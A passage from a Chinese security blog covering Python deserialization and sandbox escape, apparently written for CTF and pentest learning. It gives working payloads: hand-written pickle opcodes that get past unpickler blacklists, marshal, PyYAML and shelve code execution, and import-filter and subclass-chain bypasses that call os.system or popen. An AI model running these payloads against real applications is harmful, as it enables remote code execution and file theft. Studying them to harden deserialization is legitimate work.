safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name)) def restricted_loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load() 那么用这种方式来处理上面的漏洞代码 import pickle import io import builtins import base64 from flask import Flask, request app &#x3D; Flask(__name__) @app.route(&quot;&#x2F;&quot;) def index(): try: user &#x3D; base64.b64decode(request.cookies.get(&#39;user&#39;)) user &#x3D; pickle.loads(user) username &#x3D; user[&quot;username&quot;] except: username &#x3D; &quot;Guest&quot; return &quot;Hello %s&quot; % username @app.route(&quot;&#x2F;user&quot;) def user(): try: user &#x3D; base64.b64decode(request.cookies.get(&#39;user&#39;)) user &#x3D; restricted_loads(user) username &#x3D; user[&quot;username&quot;] except: username &#x3D; &quot;Guest&quot; return &quot;Hello %s&quot; % username class RestrictedUnpickler(pickle.Unpickler): safe_list &#x3D; &#123; &#39;range&#39;, &#39;slice&#39;, &#39;set&#39; &#125; def find_class(self, module, name): if module &#x3D;&#x3D; &#39;builtins&#39; and name in safe_list: return getattr(builtins, name) raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %(module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run() 在user路径下，os模块的命令执行就不能使用了。准确的说只能考虑builtins.*的形式 那么先来看一个这个函数是怎么调用的，查看文件 https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py 当读取到第一个字符c的时候，也就是模块名，调用的是load_global方法，查找此方法。 def load_global(self): module &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;) name &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;) klass &#x3D; self.find_class(module, name) self.append(klass) dispatch[GLOBAL[0]] &#x3D; load_global 把第一参数当作模块，第二个参数当作属性传入find_class中。而find_class： def find_class(self, module, name): # Subclasses may override this. sys.audit(&#39;pickle.find_class&#39;, module, name) if self.proto &lt; 3 and self.fix_imports: if (module, name) in _compat_pickle.NAME_MAPPING: module, name &#x3D; _compat_pickle.NAME_MAPPING[(module, name)] elif module in _compat_pickle.IMPORT_MAPPING: module &#x3D; _compat_pickle.IMPORT_MAPPING[module] __import__(module, level&#x3D;0) if self.proto &gt;&#x3D; 4: return _getattribute(sys.modules[module], name)[0] else: return getattr(sys.modules[module], name) 其中的代码看起来有点不好理解，其实就是表述官方的导入模块的限制，比如python2中写法 def find_class(self, module, name): __import__(module) mod &#x3D; sys.modules[module] klass &#x3D; getattr(mod, name) return klass 看到__import__就大概可以理解，上面说的为啥pickle会自动解决导入的问题。那么这个怎么绕过呢，如果是按照官方给的例子，绕过的形式暂时没有发现。如果按照类似如下限制，find_class的限制仅仅是对该函数参数过滤，并没有hook __import__等函数，所以通过eval(&#39;__import__(\\&#39;xx\\&#39;)&#39;)等即可绕过。 import io import pickle safe_builtins &#x3D; &#123; #白名单 &#39;range&#39;, &#39;complex&#39;, &#39;set&#39;, &#39;frozenset&#39;, &#39;slice&#39;, &#125; class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module &#x3D;&#x3D; &quot;builtins&quot;: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name)) def restricted_loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load() 也就是必须在builtins模块下执行，那么其中哪些函数我们可以调用,python3 builtins.__getattribute__(&#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,) builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,) 是不是有点沙箱逃逸的感觉了，虽然并不一样。 new.classobjpython2中的旧式类型，python3中已经弃用，使用type来代替classobj。做用是创建一个新的类型对象。 使用方法： classobj(&#39;className&#39;,(baseClass,),&#123;dictAttr:dictValue,...&#125;) from new import classobj myClass&#x3D; classobj(&quot;HelloClass&quot;, (object, ), &#123;&quot;name&quot;:&quot;boy&quot;, &quot;school&quot;:&quot;hn&quot;&#125;) 看到类的名称并不是定义的classobj中的className参数。如果在python2下，如何利用这个模块来执行命令呢。 classobj(&#39;system&#39;, (), &#123;&#39;__getinitargs__&#39;:lambda self,arg&#x3D;(&#39;whoami&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;&#125;) 构造一条完整的命令 payload2 &#x3D; pickle.dumps(classobj(&#39;system&#39;, (), &#123;&#39;__getinitargs__&#39;:lambda self,arg&#x3D;(&#39;whoami&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;&#125;)()) pickle.loads(payload2) 手写opcode没有看上面提到的那个文章的，可以先看看这一篇https://xz.aliyun.com/t/7012。主要介绍了在python2下的构造，下面主要使用python3，不过仍然可以参考。opcode版本向下兼容，所以要是了解0版本的opcode，也可以在python3中使用。 python3中的opcode：https://github.com/python/cpython/blob/3.8/Lib/pickle.py 为啥需要手写opcode，假设我们想执行如下命令，在内建函数中引用形式如下，如果有一个黑名单禁用eval，那么利用__reduce__就不能使用了。 builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,) 但是在__reduce__生成的序列化字符串，只能执行一个函数，而且在对open传参的过程中，程序会报错。 不能正常生成序列化字符串，这就需要手写一个序列化字符串。 在这之前，先看一个简单的opcode是如何构造的。利用pickletools来查看，先利用上面的一串利用脚本 import pickletools class exp(object): def __reduce__(self): return (os.system,(&#39;whoami&#39;,)) e &#x3D; exp() s &#x3D; pickle.dumps(e) pickletools.dis(s) 在python3下生成结果为： b&#39;\\x80\\x03cnt\\nsystem\\nq\\x00X\\x06\\x00\\x00\\x00whoamiq\\x01\\x85q\\x02Rq\\x03.&#39; 0: \\x80 PROTO 3 #协议版本 2: c GLOBAL &#39;nt system&#39; #把nt.system对象压栈 os.system 13: q BINPUT 0 #把对象存储到memo的第0个位置 ... 15: X BINUNICODE &#39;whoami&#39; #压入一个utf-8的元素参数 &#39;whoami&#39; 26: q BINPUT 1 #存储到memo的第1个位置 ... 28: \\x85 TUPLE1 #将前面的元素参数弹出，组成元组再压栈 (&#39;whoami&#39;,) 29: q BINPUT 2 #将上面的元组存储到memo的第2个位置 ... 31: R REDUCE #将对象和元组组合执行，结果压栈 os.system(&#39;whoami&#39;) 32: q BINPUT 3 #存储到memo的第3个位置上 ... 34: . STOP #停止 跟python2的对比一下 cnt system p0 (S&#39;whoami&#39; p1 tp2 Rp3 . 0: c GLOBAL &#39;nt system&#39; #压入对象 11: p PUT 0 #存储到memo的0位置 14: ( MARK #压入一个MARK 15: S STRING &#39;whoami&#39; #压入一个字符串 25: p PUT 1 #存储到memo的1位置 28: t TUPLE (MARK at 14) #组合参数成元组，相当于一个右括号 29: p PUT 2 #存储到memo的第2位置 32: R REDUCE #组合对象和元素，结果压栈 33: p PUT 3 #结果存储到memo的第3位置 36: . STOP #停止 其中的memo是可以去除的，可以进一步省略为 cnt system (S&#39;whoami&#39; tR. 从显示上看，明显是0版本更为好构造，既然如此，就用0版本来手写一个 builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,) 首先保证模块和调用函数 cbuiltins getattr 把参数压入，不过其中有个问题，上面压入参数的时候都是字符串，其中却有个对象，如果直接压入明显是报错，要是使用c来导入模块，下面还需要接一个实例，所以这里并不能直接压入单一的对象。也就是需要从某个模块中调用到builtins，例如无限套娃： &gt;&gt;&gt; builtins.__dict__.get(&#39;globals&#39;)().get(&#39;__builtins__&#39;) &lt;module &#39;__builtins__&#39; (built-in)&gt; 但是这里来回连续调用好几次函数，看起来也不好弄，跟上面联合分开查看 get &#x3D; builtins.getattr(builtins.__dict__, &#39;get&#39;) builtins &#x3D; get(&#39;globals&#39;)().get(&#39;__builtins__&#39;) 只不过到此犯了一个错误，过于依赖其中的魔法函数，导致忘记builtins本身就可以直接调用globals。行吧。。。 builtins &#x3D; builtins.globals().get(&#39;builtins&#39;) 那这里就分块来构造。 cbuiltins globals #builtins.globals 那么后面调用get函数，这里知道globals获取的实际是一个dict属性对象。如果想使用get，当然也不能直接用，又要先去获取get。 cbuiltins getattr (cbuiltins dict S&#39;get&#39; tR. #builtins.dict.get -&gt; &lt;method &#39;get&#39; of &#39;dict&#39; objects&gt; 再把获取到的get跟上面的函数撮合一下，这里get放在上面，虽说是调用get属性来处理，但是也是在获取到全局属性后，利用get来进行的筛选 cbuiltins getattr (cbuiltins dict S&#39;get&#39; tR(cbuiltins globals (tRS&#39;builtins&#39; tR. 记得R后要有跟的后续参数或对象，我也没明白为啥，反正没有就会报错，踩这个坑踩了N久。获取到builtins，再去获取其中的函数。 cbuiltins getattr (.... #上文获取到的builtins S&#39;eval&#39; tRp1 (S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39; tR. 在某一个黑名单的过滤中，就可以使用此来绕过，在这种黑名单中__reduce__是会先把builtins.getattr(builtins,&#39;eval&#39;)解释为builtins.eval导致被拦截。 #coding:utf-8 import io import pickle import builtins import os blacklist &#x3D; &#123; &#39;eval&#39;, &#39;exec&#39; &#125; class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module &#x3D;&#x3D; &quot;builtins&quot; and name not in blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name)) def restricted_loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load() class exp(object): def __reduce__(self): return (builtins.getattr(builtins,&#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)) # e &#x3D; exp() # s &#x3D; pickle.dumps(e) s &#x3D; b&quot;&quot;&quot;cbuiltins getattr (cbuiltins getattr (cbuiltins dict S&#39;get&#39; tR(cbuiltins globals (tRS&#39;builtins&#39; tRS&#39;eval&#39; tRp1 (S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39; tR.&quot;&quot;&quot; restricted_loads(s) 到此为了对了黑名单过滤的方法已经取得了部分胜利，opcode不止这些还有很多没用到。 执行函数的并不只是R，还有O和I，都是小写，比如获取get。 #使用o，使用第一个参数作为函数，第二到n个元素作为参数 b&quot;&quot;&quot;(cbuiltins getattr cbuiltins dict S&#39;get&#39; o.&quot;&quot;&quot; #使用i,先获取全局函数，在计算mark之后的数据组合为元组作为参数 b&quot;&quot;&quot;(cbuiltins dict S&#39;get&#39; ibuiltins getattr .&quot;&quot;&quot; 如果不想什么都去手写，或者也不是很熟练，可以参考 https://github.com/sensepost/anapickle/blob/master/anapickle.py 其中列出来不少完善的opcode，只需要按照提示修改其中的关键词，就可以使用，只不过这个脚本是利用python2，其中有些函数已经在python3下取消了，需要查看修改。 反序列化漏洞Marshal上面扯了半天的pickle，那么现在看看还有啥别的序列化库吧。由于pickle不能序列化code对象，所以在python2.6后新增marshal来处理code对象的序列化。 #coding:utf-8 import pickle,builtins,pickletools,base64 import marshal import urllib def foo(): import os def fib(n): if n &lt;&#x3D; 2: return n return fib(n-1) + fib(n-2) print (fib(5)) try: pickle.dumps(foo.__code__) except Exception as e: print(e) code_serialized &#x3D; base64.b64encode(marshal.dumps(foo.__code__)) print (code_serialized) 如何去反序列化并且执行函数。 code_unserialized &#x3D; marshal.loads(base64.b64decode(code_serialized)) print(code_unserialized) &lt;code object foo at 0x000001E232E27AE0, file &quot;E:&#x2F;poc.py&quot;, line 7&gt; code_unserialized &#x3D; types.FunctionType(code_unserialized, globals(), &#39;&#39;)() print(code_unserialized) 8 None 这样就可以之间获取一个opcode。 ctypes FunctionType (cmarshal loads (cbase64 b64decode (S&#39;YwAAA...&#39; #code对象序列化编码 tRtRc__builtin__ globals (tRS&#39;&#39; tR(tR. 组合脚本 import marshal import base64 def foo(): pass # Your code here print &quot;&quot;&quot;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S&#39;%s&#39; tRtRc__builtin__ globals (tRS&#39;&#39; tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code)) 利用上面的序列化在pickle下尝试执行，调用os模块来执行其中的函数。 def foo(): import os return os.system(&#39;whoami&#39;) code_serialized &#x3D; base64.b64encode(marshal.dumps(foo())) print (code_serialized) payload &#x3D; b&quot;&quot;&quot;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S&#39;6QAAAAA&#x3D;&#39; #whomai tRtRc__builtin__ globals (tRS&#39;&#39; tR(tR.&quot;&quot;&quot; data &#x3D; pickle.loads(payload) print(data) 于是又有一个黑名单绕过执行函数的方式。 PyYAMLyaml和xml、json等类似，都是标记类语言，有自己的语法格式。各个支持yaml格式的语言都会有自己的实现来进行yaml格式的解析（读取和保存），其中PyYAML就是python的一个yaml库。 除了 YAML 格式中常规的列表、字典和字符串整形等类型转化外（基本数据类型），各个语言的 YAML 解析器或多或少都会针对其语言实现一套特殊的对象转化规则（也就是序列化和反序列化，这是关键点，是这个漏洞存在的前提)。 使用了yaml.load而不是yaml.safe_load函数来解析yaml文件的程序，yaml.load和pickle.load具有一样的功能，可以调用所有python函数。 yaml.load 函数的作用是用来将YAML文档转化成Python对象。 &gt;&gt;&gt; yaml.load(&quot;&quot;&quot;- 111&quot;&quot;&quot;) [111] &gt;&gt;&gt; yaml.load(&quot;&quot;&quot;111&quot;&quot;&quot;) 111 如果字符串或者文件中包含多个YAML文档，那么可以使用 yaml.load_all 函数将它们全部反序列化 &gt;&gt;&gt; cp &#x3D; &quot;&quot;&quot; ... aaaa ... --- ... bbbb ... --- ... cccc ... &quot;&quot;&quot; &gt;&gt;&gt; yaml.load_all(cp) &lt;generator object load_all at 0x0000026FBEBDD390&gt; &gt;&gt;&gt; for i in yaml.load_all(cp): ... print(i) ... aaaa bbbb cccc yaml标签和python对象的关系，部分关系，详细https://pyyaml.org/wiki/PyYAMLDocumentation !!str str或unicode !!map dict !!python&#x2F;str str !!python&#x2F;dict dict !!python&#x2F;name:module.name module.name !!python&#x2F;module:package.module package.module !!python&#x2F;object:module.cls module.cls !!python&#x2F;object&#x2F;new:module.cls module.cls !!python&#x2F;object&#x2F;apply:module.f 可以使用!!python/object序列化任意对象。 !!python&#x2F;object:module.Class &#123; attribute: value, ... &#125; 为了支持pickle协议，提供了两种附加形式的!!python/object标签 !!python&#x2F;object&#x2F;new:module.Class args: [argument, ...] kwds: &#123;key: value, ...&#125; state: ... listitems: [item, ...] dictitems: [key: value, ...] !!python&#x2F;object&#x2F;apply:module.function args: [argument, ...] kwds: &#123;key: value, ...&#125; state: ... listitems: [item, ...] dictitems: [key: value, ...] 构造一个序列化，dump的结果就是上面的标签形式。 #coding:utf-8 import yaml,os class test: def __init__(self): os.system(&#39;whoami&#39;) payload &#x3D; yaml.dump(test()) print(payload) yaml.load(payload) #misaki\\user #!!python&#x2F;object:__main__.test &#123;&#125; 直接发送一个序列化值 cp &#x3D; &quot;&quot;&quot;!!python&#x2F;object&#x2F;apply:os.system [&#39;whoami&#39;]&quot;&quot;&quot; #cp &#x3D; &quot;&quot;&quot;!!python&#x2F;object&#x2F;new:os.system [&#39;whoami&#39;]&quot;&quot;&quot; yaml.load(cp) #misaki\\user 不过此处并不能直接使用!!python/object:，因为它接收的是一个dict类型的对象属性。并不接收args的列表参数。当调用yaml.load的时候是使用!!python/object来处理。 避免此问题可以使用safe_load来替换load，该函数yaml.safe_load将此功能限制为简单的Python对象（例如整数或列表）。 cp &#x3D; &quot;&quot;&quot; !!python&#x2F;object&#x2F;apply:os.system [&#39;whoami&#39;] &quot;&quot;&quot; yaml.safe_load(cp) #yaml.constructor.ConstructorError: could not determine a constructor for the tag Jsonpickle用于将任意对象序列化为JSON的Python库。Jsonpickle可以使用几乎所有Python对象并将该对象转换为JSON。另外，它可以将对象重新构造回Python。该对象必须可以通过模块进行全局访问，并且必须继承自对象（又称新类）。https://jsonpickle.github.io/#module-jsonpickle 创建一个对象： class Thing(object): def __init__(self, name): self.name &#x3D; name obj &#x3D; Thing(&#39;Awesome&#39;) 使用Jsonpickle将对象转换为JSON字符串： import jsonpickle frozen &#x3D; jsonpickle.encode(obj) 使用Jsonpickle从JSON字符串重新创建Python对象： thawed &#x3D; jsonpickle.decode(frozen) 如果使用跟原pickle相似的利用方式 &gt;&gt;&gt; class Thing(object): ... def __init__(self, name): ... os.system(&#39;whoami&#39;) ... &gt;&gt;&gt; obj &#x3D; Thing(&#39;Awesome&#39;) misaki\\user Shelveshelve用处是让对象持久化，但它在序列化与反序列化的过程中使用了pickle模块，因此我们可以利用shelve会调用的pickle在反序列化过程中执行代码。 import shelve import os class exp(object): def __reduce__(self): return (os.system(&#39;ls&#39;)) file &#x3D; shelve.open(&quot;test&quot;) file[&#39;exp&#39;] &#x3D; exp() 文章参考：Python反序列化漏洞的花式利用，pickle反序列化初探，Python Pickle的任意代码执行漏洞实践和Payload构造，Python反序列化安全问题，Code-Breaking中的两个Python沙箱，Arbitrary code execution with Python pickles，Python PyYAML反序列化漏洞实验和Payload构造","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"python 沙箱逃逸与SSTI","slug":"python-沙箱逃逸与SSTI","date":"2020-04-21T01:11:03.000Z","updated":"2020-04-24T07:38:48.000Z","comments":true,"path":"2020/04/python-沙箱逃逸与SSTI/","link":"","permalink":"https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/","excerpt":"","text":"沙箱逃逸概述沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程。 既然是想getshell，或者说是执行命令就需要一个可执行命令的包。可直接执行命令的模块有 os pty subprocess plarform commands 有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块： file open codecs fileinput 不过其中file只在python2中执行，左2右3。 函数导入限制和绕过import一个受限制的环境，禁止导入敏感的包是最常见的方法，所以import一般是最容易被限制掉。 import re,sys pattern &#x3D; re.compile(&#39;import\\s+(os|subprocess)&#39;) match &#x3D; re.search(pattern,sys.args[1]) if match: print &quot;forbidden module import detected&quot; raise Exception 这种简单的限制不能导入包的形式，可以中间添加空格来绕过，或者使用其他方式导入包，比如 __import__ importlib 还可以使用编码的方式绕过对导入包关键字的检查，比如使用base64，python2中适用 &gt;&gt;&gt; import base64 &gt;&gt;&gt; base64.b64encode(&quot;os&quot;) &#39;b3M&#x3D;&#39; &gt;&gt;&gt; flag &#x3D; __import__(base64.b64decode(&#39;b3M&#x3D;&#39;)) &gt;&gt;&gt; flag.system(&#39;whoami&#39;) misaki\\user &gt;&gt;&gt; import importlib &gt;&gt;&gt; flag &#x3D; importlib.import_module(&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)) &gt;&gt;&gt; flag.system(&#39;whoami&#39;) misaki\\user 或者使用字符串拼接的方式 &gt;&gt;&gt; __import__(&#39;o&#39;+&#39;s&#39;).system(&#39;who&#39;+&#39;ami&#39;) 字符串f翻转截取 &gt;&gt;&gt; __import__(&#39;so&#39;[::-1]).system(&#39;whoami&#39;) misaki\\user &gt;&gt;&gt; exec(&#39;)&quot;imaohw&quot;(metsys.so ;so tropmi&#39;[::-1]) misaki\\user 再万一，他是这么禁止的 import re,sys pattern &#x3D; re.compile(&#39;import&#39;) match &#x3D; re.search(pattern,sys.args[1]) if match: print &quot;forbidden module import detected&quot; raise Exception 这样的话，不管怎么换导入函数都会被禁止。那么是否有不直接使用import关键字来导入的方式。既然需要导入也就是只需要能执行对应的库就可以。 使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile &gt;&gt;&gt; execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;) #Linux系统下默认路径 &gt;&gt;&gt; system(&#39;whoami&#39;) misaki python3可以利用读取文件，配合exec来执行 &gt;&gt;&gt; f &#x3D; open(r&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;) &gt;&gt;&gt; exec(f.read()) &gt;&gt;&gt; system(&#39;whoami&#39;) misaki #不可以执行利用exec打开读取，exec需要执行的是其中的内容，直接打开的时候exec执行的就是读取文件操作 exec(&quot;open(&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;).read()&quot;) 使用with open的形式 &gt;&gt;&gt; with open(&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;) as f: ... exec(f.read()) ... &gt;&gt;&gt; system(&#39;whoami&#39;) misaki 或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。 &gt;&gt;&gt; exec(&#39;imp&#39;+&#39;ort&#39;+&#39; &#39;+&#39;os;&#39;+&#39;os.system(&quot;whoami&quot;)&#39;) misaki\\user 这里exec不需要导入就可以直接引用，当然不需要导入就可以引用的函数不止这一个，因为一个内建函数的原因。 __builtins____builtins__即时引用，在程序还为执行代码的时候就已经加载进来了。此模块并不需要导入，可以在任何模块中执行引用。比如在python2中 在python3中 所以我们通过dict属性来调用这些函数，例如如下调用exec来执行其中的python语句。 &gt;&gt;&gt; __builtins__.__dict__[&#39;exec&#39;](&quot;print(&#39;ok&#39;)&quot;) ok 通过内建函数来导入包 &gt;&gt;&gt; __builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;) misaki\\user 万一跟上面一样，禁用了import，当然还可以使用拼接的方式 &gt;&gt;&gt; __builtins__.__dict__[&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).system(&#39;whoami&#39;) misaki\\user 如果在__builtins__中，部分需要引用的函数被删除。不能直接用dict属性来调用，可以使用reload来重新加载 reload(__builtin__) 如果仔细看上面的图片就可以看到，在python2中reload也是__builtin__的内建函数。如果此函数被删除在python2中也不可以直接引用了。python3中reload不再是内建函数，3.4之前是imp模块下的函数，而之后是importlib模块下的函数。 所以可以直接利用imp模块来导入，python2也可以利用。 &gt;&gt;&gt; import imp &gt;&gt;&gt; imp.reload(__builtins__) &lt;module &#39;__builtin__&#39; (built-in)&gt; 在所上的导入模块中，系统的包都在一个默认路径下，被sys的modules存储记录。如果把其中的os模块删除就不能再去加载os模块了，这时候需要手动把os重新加载进去。一般尝试默认路径，或者sys查看存储路径 &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.modules[&#39;os&#39;]&#x3D;&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39; &gt;&gt;&gt; import os &gt;&gt;&gt; 魔法函数python沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。 先看看几个常用的魔法函数 __class__ 返回调用的类型 class A(): pass a &#x3D; A() print(a.__class__) #&lt;class &#39;__main__.A&#39;&gt; __mro__ 查看类继承的所有父类，直到object class A: pass class B(A): pass class C(A): pass class D(B, C): pass print(D.__mro__) #(&lt;class &#39;__main__.D&#39;&gt;, &lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;, &lt;class &#39;__main__.A&#39;&gt;, &lt;class &#39;object&#39;&gt;) __subclasses__ 获取类的所有子类 class A(object): pass class B(A): pass class C(A): pass print(A.__subclasses__()) #[&lt;class &#39;__main__.B&#39;&gt;, &lt;class &#39;__main__.C&#39;&gt;] __bases__ 返回所有直接父类组成的元组 class A(object): pass class B(A): pass print(B.__bases__) #(&lt;class &#39;__main__.A&#39;&gt;,) 不返回object类 __init__ 类实例创建之后调用, 对当前对象的实例的一些初始化 class A: def __init__(self): print(&#39;ok&#39;) a &#x3D; A() # 输出ok __globals__ 能够返回函数所在模块命名空间的所有变量 class A(object): def __init__(self, a, b): self.a &#x3D; a self.b &#x3D; b a.__init__.__globals__ &#123;&#39;A&#39;: &lt;class &#39;__main__.A&#39;&gt;, &#39;a&#39;: &lt;__main__.A object at 0x0000000001692390&gt;, &#39;importlib&#39;: &lt;module &#39;importlib&#39; f rom &#39;D:\\anaconda\\lib\\importlib\\__init__.pyc&#39;&gt;, &#39;__builtins__&#39;: &lt;module &#39;__bu iltin__&#39; (built-in)&gt;, &#39;pattern&#39;: &lt;_sre.SRE_Pattern object at 0x0000000001695030&gt;, &#39;base64&#39;: &lt;module &#39;base64&#39; f rom &#39;D:\\anaconda\\lib\\base64.pyc&#39;&gt;, &#39;sys&#39;: &lt;module &#39;sys&#39; ( built-in)&gt;, &#39;flag&#39;: &lt;module &#39;os&#39; from &#39;D:\\anaconda\\lib\\os.p yc&#39;&gt;, &#39;__packa ge__&#39;: None, &#39;os&#39;: &lt;module &#39;os&#39; from &#39;D:\\anaconda\\lib\\os.pyc&#39;&gt;, &#39;__doc__&#39;: None, &#39;match&#39;: &lt;_sre.SRE_Match obje ct at 0x00000000039A9B28&gt;&#125; __getattribute__ 当类被调用的时候，无条件进入此函数。 __getattr__ 对象中不存在的属性时调用 class A: def __init__(self): self.name &#x3D; &quot;Bob&quot; def __getattribute__(self,item): print(&quot;ok&quot;) a &#x3D; A() a.name #ok, 这时候不管调用什么属性都会返回ok，相当于拦截了属性调用。 def __getattr__(self): print(&#39;getattr&#39;) a.age #getattr 调用不存在的属性会执行，相当于处理了AttributeError。 类继承使用尝试利用继承关系来找到object类 &quot;&quot;.__class__.__bases__ #(&lt;class &#39;object&#39;&gt;,) 前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。 [].__class__.__bases__ &#123;&#125;.__class__.__bases__ 在object类下去查找所有的子类，然后去查找可利用类，__bases__返回是元组，使用下标获得object类。 &quot;&quot;.__class__.__bases__[0].__subclasses__() 找到需要使用的类，其中有可以使用的类，在python3中使用 &lt;class &#39;os._wrap_close&#39;&gt;,&lt;class &#39;warnings.WarningMessage&#39;&gt; 调用他们 &gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[128] &lt;class &#39;os._wrap_close&#39;&gt; &gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[177] &lt;class &#39;warnings.WarningMessage&#39;&gt; 如果子类过多，不好查找是第几个下标，可以使用如下来标记 for i in enumerate(&quot;&quot;.__class__.__bases__[0].__subclasses__()): print i 先来读取一下文件，C盘下的win.ini文件 &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__ 从中查找是否有关于文件读取的方法，比如open，file函数。在最后找到一个popen函数。 &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;C:\\\\windows\\\\win.ini&quot;).read() 如果想直接在终端显示出来 &quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&quot;type C:\\\\windows\\\\win.ini&quot;).read() 在python2中可以使用如下形式读取文件的第一行，在python2中前面是否字符串还是元组或者字典对后面类的查找有不一样的结果。 ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].getline(&quot;C:\\\\windows\\\\win.ini&quot;,1) 执行命令 &gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;whoami&#39;) misaki\\user 但是python2如果使用字符串的形式，会报如下错误，因为__bases__获取的并不是object类 &gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[59] Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt; IndexError: list index out of range 只需要再去获得一次即可 &gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__bases__[0].__subclasses__()[59] &lt;class &#39;warnings.WarningMessage&#39;&gt; 特殊函数查找python3在GitHub的python页面上把自带函数全部获取目前的3.8的模块(202) asyncio collections concurrent ctypes curses dbm distutils email encodings ...... warnings.py wave.py weakref.py webbrowser.py xdrlib.py zipapp.py zipfile.py zipimport.py 将这么模块进行筛选，规则这些模块哪些有调用上面提到的模块，或者文件读取等方法。 # coding&#x3D;UTF-8 import codecs from collections import defaultdict with codecs.open(&#39;python.txt&#39;, &#39;r&#39;, encoding&#x3D;&#39;UTF-8&#39;) as f: modules &#x3D; f.readlines() modules &#x3D; [m.strip().replace(&#39;.py&#39;, &#39;&#39;) for m in modules] target_modules &#x3D; [&#39;os&#39;, &#39;platform&#39;, &#39;subprocess&#39;, &#39;timeit&#39;, &#39;importlib&#39;, &#39;codecs&#39;, &#39;sys&#39;, &#39;commands&#39;] target_functions &#x3D; [&#39;__import__&#39;, &#39;__builtins__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;file&#39;, &#39;open&#39;, &#39;codecs&#39;] all_targets &#x3D; target_modules + target_functions results &#x3D; defaultdict(list) for m in modules: try: module &#x3D; __import__(m) except Exception as e: # print(&#39;ERROR:&#39;, m) pass for t in all_targets: if t in module.__dict__: results[m.encode()].append(t) print(&quot;可利用模块数量为:&quot;+str(len(results))) for k, v in results.items(): print(k, v) 筛选完成后有python3两百个模块可能可以利用，然后再利用脚本进一步筛选 find_modules &#x3D; &#123; &#125; target_modules &#x3D; [&#39;os&#39;, &#39;platform&#39;, &#39;subprocess&#39;, &#39;timeit&#39;, &#39;importlib&#39;, &#39;codecs&#39;, 